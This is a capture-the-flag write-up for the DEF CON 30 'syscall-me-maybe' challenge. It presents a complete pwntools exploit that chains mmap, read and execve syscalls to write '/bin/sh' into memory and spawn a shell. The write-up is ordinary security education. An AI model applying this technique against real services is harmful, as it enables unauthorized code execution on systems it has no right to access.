# defcon30 speedrun - syscall-me-maybe

after a quick look you see the challenge get a value and save in rdi, then rsi, rdx, r10, r8 and r9, then ask you about your syscall number.

![Screenshot_2022-09-02_23_46_22](https://user-images.githubusercontent.com/83473054/188107346-0f0837e8-e640-4325-bd4b-db9ebcf4894a.png)

I did checksec on this bin file
pie is enabled.

## exploit
```python
from pwn import *

p = process('./challenge')
e = ELF('./challenge')
gdb.attach(p,'''
    b *main
''')

```

in above code I loaded the elf file and make gdb ready for debugging stuff. then we must create a new mapping in the virtual address space for bypassing ASLR.

```python

PROT_READ = 0x1
PROT_WRITE = 0x2
PROT_EXEC = 0x4
MAP_SHARED = 0x1
MAP_FIXED = 0x10
MAP_PRIVATE = 0x2
MAP_ANONYMOUS = 0x20

p.sendlineafter('want for rdi?',str(0x1000000))
p.sendlineafter('want for rsi?',str(0x4096))
p.sendlineafter('want for rdx?',str(PROT_READ|PROT_WRITE|PROT_EXEC))
p.sendlineafter('want for r10?',str(MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED))
p.sendlineafter('want for r8?',str(0))
p.sendlineafter('want for r9?',str(0))

p.sendlineafter('syscall number to call?',str(9))
```
I did mmap above, you could read about mmap

now we have a rwx part in the memory wich starts at 0x1000000, we are able to write our "/bin/sh" string there

```python
p.sendlineafter('Do another (0/1)?',str(0x1))
bin_sh = "/bin/sh\x00"

p.sendlineafter('want for rdi?',str(0x0))
p.sendlineafter('want for rsi?',str(0x1000000))
p.sendlineafter('want for rdx?',str(0x8))
p.sendlineafter('want for r10?',str(0))
p.sendlineafter('want for r8?',str(0))
p.sendlineafter('want for r9?',str(0))

p.sendlineafter('syscall number to call?',str(0))
p.send(bin_sh)
```

now we have "/bin/sh" in the memory and for mmap stuff we now where it's located.

```python
p.sendlineafter('Do another (0/1)?',str(0x1))

p.sendlineafter('want for rdi?',str(0x1000000))
p.sendlineafter('want for rsi?',str(0))
p.sendlineafter('want for rdx?',str(0))
p.sendlineafter('want for r10?',str(0))
p.sendlineafter('want for r8?',str(0))
p.sendlineafter('want for r9?',str(0))
p.sendlineafter('syscall number to call?',str(0x3b))
p.interactive()```

and above code is execve.


## full exploit

```python
from pwn import *

p = process('./challenge')
e = ELF('./challenge')
gdb.attach(p,'''
    b *main
''')


PROT_READ = 0x1
PROT_WRITE = 0x2
PROT_EXEC = 0x4
MAP_SHARED = 0x1
MAP_FIXED = 0x10
MAP_PRIVATE = 0x2
MAP_ANONYMOUS = 0x20


p.sendlineafter('want for rdi?',str(0x1000000))
p.sendlineafter('want for rsi?',str(0x4096))
p.sendlineafter('want for rdx?',str(PROT_READ|PROT_WRITE|PROT_EXEC))
p.sendlineafter('want for r10?',str(MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED))
p.sendlineafter('want for r8?',str(0))
p.sendlineafter('want for r9?',str(0))

p.sendlineafter('syscall number to call?',str(9))

p.sendlineafter('Do another (0/1)?',str(0x1))
bin_sh = "/bin/sh\x00"

p.sendlineafter('want for rdi?',str(0x0))
p.sendlineafter('want for rsi?',str(0x1000000))
p.sendlineafter('want for rdx?',str(0x8))
p.sendlineafter('want for r10?',str(0))
p.sendlineafter('want for r8?',str(0))
p.sendlineafter('want for r9?',str(0))

p.sendlineafter('syscall number to call?',str(0))
p.send(bin_sh)

p.sendlineafter('Do another (0/1)?',str(0x1))

p.sendlineafter('want for rdi?',str(0x1000000))
p.sendlineafter('want for rsi?',str(0))
p.sendlineafter('want for rdx?',str(0))
p.sendlineafter('want for r10?',str(0))
p.sendlineafter('want for r8?',str(0))
p.sendlineafter('want for r9?',str(0))
p.sendlineafter('syscall number to call?',str(0x3b))
p.interactive()
```
